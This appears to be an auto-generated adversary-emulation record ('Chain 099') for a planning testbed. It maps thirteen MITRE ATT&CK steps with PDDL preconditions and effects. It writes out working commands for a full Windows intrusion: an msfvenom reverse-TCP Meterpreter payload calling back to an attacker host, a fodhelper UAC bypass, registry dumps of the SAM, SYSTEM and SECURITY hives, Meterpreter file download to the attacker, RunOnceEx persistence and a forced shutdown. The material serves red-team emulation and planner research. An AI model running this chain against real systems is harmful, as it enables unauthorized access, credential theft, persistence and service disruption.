# Chain 099

**Testbed**: `env0` · **Steps**: 13 · **Tactics touched**: Command and Control, Execution, Discovery, Privilege Escalation, Defense Evasion, Credential Access, Collection, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1071.001, T1204.002, T1059.003 |
| Discovery | T1082 |
| Privilege Escalation | T1548.002 |
| Defense Evasion | T1548.002 |
| Credential Access | T1003.002 |
| Collection | T1020 |
| Persistence | T1547.001 |
| Impact | T1529 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Meterpreter session (for Windows) using MSFVenom | MSFVenom Console |
| 2 | Execution, Command and Control | T1071.001 | Set an MSF payload handler for a file-backed payload | Metasploit Executor |
| 3 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file | Human |
| 4 | Command and Control | T1071.001 | Execute a Meterpreter Payload | Meterpreter Session Establish |
| 5 | Discovery | T1082 | Retrieve Environment Variable | Meterpreter Executor |
| 6 | Execution | T1059.003 | Get an Interactive Shell on Windows | Meterpreter Session Derive |
| 7 | Privilege Escalation, Defense Evasion | T1548.002 | Bypass UAC using Fodhelper | Command Prompt Executor |
| 8 | Command and Control | T1071.001 | Execute a Meterpreter Payload | Meterpreter Session Establish |
| 9 | Execution | T1059.003 | Get an Interactive Shell on Windows | Meterpreter Session Derive |
| 10 | Credential Access | T1003.002 | Registry dump of SAM, creds, and secrets | Command Prompt Executor |
| 11 | Collection | T1020 | File Download Operation | Meterpreter Executor |
| 12 | Persistence | T1547.001 | Reg Key RunOnce | Command Prompt Executor |
| 13 | Impact | T1529 | Shutdown System - Windows | Command Prompt Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Meterpreter session (for Windows) using MSFVenom

- **UUID**: `msfvenom-1`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command uses MSFVenom to generate a payload designed for remote access to a target machine.

**Execution** (MSFVenom Console)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe -o #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | no |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`

---

### Step 2 — Set an MSF payload handler for a file-backed payload

- **UUID**: `set-msf-payload-handler-for-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution, Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Windows Command Shell, Ingress Tool Transfer, Non-Standard Por

**Description**

Same MSF `exploit/multi/handler` mechanism as `set-msf-payload-handler`, but
for the case where the meterpreter payload has been (or will be) staged as a
file on the victim.

This variant additionally grants `(callback-covered ?file)` for the payload's
file — the gate that every execute-* action requires before running that file.
Payload-genesis actions (msfvenom) deliberately do NOT produce
`callback-covered`, so payload files are born uncovered; firing this action
is what makes them safe to execute. This forces the planner to sequence
handler-set before any execute-* on the payload file — the ordering
constraint is encoded directly in PDDL preconditions.

Use `set-msf-payload-handler` (no file) for fileless delivery: reflective
loading, in-memory shellcode injection, staged callback with no on-disk
artifact.

**Execution** (Metasploit Executor)

```
exploit_and_execute_payload(exploit_module_name = "exploit/multi/handler",
                            payload_module_name = "#{payload_name}",
                            listening_host = "#{LHOST}",
                            listening_port = "#{LPORT}"):
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | no |
| `LPORT` | listening port of the attacter machine | — | no |
| `payload_name` | payload type set by msf | — | no |

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`

**Effects**

- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 3 — Simulate the victim download and execute malicious payload file

- **UUID**: `simulate-download-execute-file`
- **Source**: Manual
- **Supported platforms**: windows, linux
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Meterpreter Payload

- **UUID**: `execute-meterpreter-payload-file`
- **Source**: Meterpreter
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Meterpreter payload will establish a Meterpreter session.

**Execution** (Meterpreter Session Establish)

```
None
```

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(meterpreter-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — Retrieve Environment Variable

- **UUID**: `meterpreter-getenv`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1082
- **Technique(s)**: System Information Discovery

**Description**

The `getenv` command retrieves the value of an environment variable on the remote target.

**Execution** (Meterpreter Executor)

```
getenv(var_name=#{name}, meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `name` | Name of the environment variable to query | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(system-information-info-known ?target - host)`

---

### Step 6 — Get an Interactive Shell on Windows

- **UUID**: `meterpreter-shell-windows`
- **Source**: Metasploit
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: {'Command and Scripting Interpreter': 'Windows Command Shell'}

**Description**

The `shell` command in a Windows meterpreter session drops into an interactive cmd.exe.

**Execution** (Meterpreter Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `executor_parent` | Parent meterpreter session ID | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 7 — Bypass UAC using Fodhelper

- **UUID**: `art-t1548_002-fodhelper-uac-bypass-cmd`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Privilege Escalation, Defense Evasion
- **MITRE ID(s)**: T1548.002
- **Technique(s)**: Abuse Elevation Control Mechanism: Bypass User Account Control

**Description**

Command Prompt variant of the fodhelper UAC bypass. Uses `reg.exe` (a Windows built-in, LOLBAS) to seed `HKCU:\Software\Classes\ms-settings\Shell\Open\command` with the executable path, then launches `fodhelper.exe`. Because `fodhelper.exe` carries `autoElevate=true` in its manifest and lives in `System32`, it reads that registry value and runs it with elevated integrity — no UAC prompt for admin-group users. ART auto_generated_guid a2d43f57-2a79-4694-b13a-92f0f6c1a97d.

Same causal / precondition / effect shape as `art-t1548_002-fodhelper-uac-bypass-ps.yml`, differing only in the shell used to seed the registry. Keeping both variants lets the planner satisfy the UAC-bypass step via whichever session type it already has on hand (cmd or PowerShell derived from Meterpreter / Sliver) without inserting an extra session-derivation hop.

**Execution** (Command Prompt Executor)

```
reg.exe add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "#{EXE_PATH}" /f
reg.exe add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
C:\Windows\System32\fodhelper.exe
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID (unelevated, admin-group user) used to invoke the UAC-bypass sequence. | — | yes |
| `EXE_PATH` | Path of the executable on the victim host that fodhelper will run with elevated integrity. Common chain use is to point at a pre-staged Meterpreter / Sliver payload. Default `cmd.exe` spawns an elevated command prompt — useful for interactive testing of the bypass itself. | C:\\Windows\\System32\\cmd.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 8 — Execute a Meterpreter Payload

- **UUID**: `execute-meterpreter-payload-file`
- **Source**: Meterpreter
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Meterpreter payload will establish a Meterpreter session.

**Execution** (Meterpreter Session Establish)

```
None
```

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(meterpreter-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 9 — Get an Interactive Shell on Windows

- **UUID**: `meterpreter-shell-windows`
- **Source**: Metasploit
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: {'Command and Scripting Interpreter': 'Windows Command Shell'}

**Description**

The `shell` command in a Windows meterpreter session drops into an interactive cmd.exe.

**Execution** (Meterpreter Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `executor_parent` | Parent meterpreter session ID | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 10 — Registry dump of SAM, creds, and secrets

- **UUID**: `art-t1003_002-reg-save-sam`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.002
- **Technique(s)**: OS Credential Dumping: Security Account Manager

**Description**

`reg save` writes the SAM, SYSTEM and SECURITY registry hives to a
target-side directory (default `%TEMP%`). The hives hold encrypted /
structured credential material — offline processing (impacket-
secretsdump, creddump7, PowerDump, …) is a separate step and is NOT
modelled by this action. A chain that wants to close the credential-
access stage via this path must include downstream file exfil +
offline-parse actions. ART auto_generated_guid
5c2571d0-1572-416d-9676-812e64ca9f44.

**Execution** (Command Prompt Executor)

```
reg save HKLM\sam #{save_dir}\sam
reg save HKLM\system #{save_dir}\system
reg save HKLM\security #{save_dir}\security
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke reg save. | — | yes |
| `save_dir` | Directory on the target where the SAM / SYSTEM / SECURITY hives are written. | %TEMP% | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-in-file ?d - data ?f - file)`
- `(file-exists ?path - string ?f - file ?target - host)`
- `(callback-covered ?f - file)`

---

### Step 11 — File Download Operation

- **UUID**: `meterpreter-download`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Collection
- **MITRE ID(s)**: T1020
- **Technique(s)**: Data from Local System

**Description**

The `download` command transfers files from the target system to the attacker machine.

**Execution** (Meterpreter Executor)

```
download(remote_path=#{remote_path}, local_path=#{output_dir}, meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `remote_path` | Full path to remote file/directory | — | yes |
| `output_dir` | Local directory to save files | /tmp | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`
- `(file-exists ?remote_path - string ?file - file ?target - host)`

**Effects**

- `(file-on-attacker ?localpath - string ?file - file)`

---

### Step 12 — Reg Key RunOnce

- **UUID**: `art-t1547_001-reg-key-runonce`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

Adds a value under `HKLM\...\CurrentVersion\RunOnceEx\0001\Depend` so
the specified command runs once at next system boot. Machine-scope
(HKLM), requires admin. ART auto_generated_guid
554cbd88-cde1-4b56-8168-0be552eed9eb.

**Execution** (Command Prompt Executor)

```
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{command_to_execute}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke reg add. | — | yes |
| `command_to_execute` | Command / path to execute at next system boot. | C:\\Users\\Public\\payload.dll | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 13 — Shutdown System - Windows

- **UUID**: `art-t1529-shutdown`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1529
- **Technique(s)**: System Shutdown/Reboot

**Description**

Issues `shutdown /s` to power down the target after a short countdown.
Availability impact — legitimate users lose access until the host is
restarted. ART auto_generated_guid ad254fa8-45c0-403b-8c77-e00b3d3e7a64.

**Execution** (Command Prompt Executor)

```
shutdown /s /t #{timeout}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke shutdown. | — | yes |
| `timeout` | Seconds until shutdown fires (giving the operator a window to abort during testing). | 60 | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(system-shutdown ?target - host)`

---
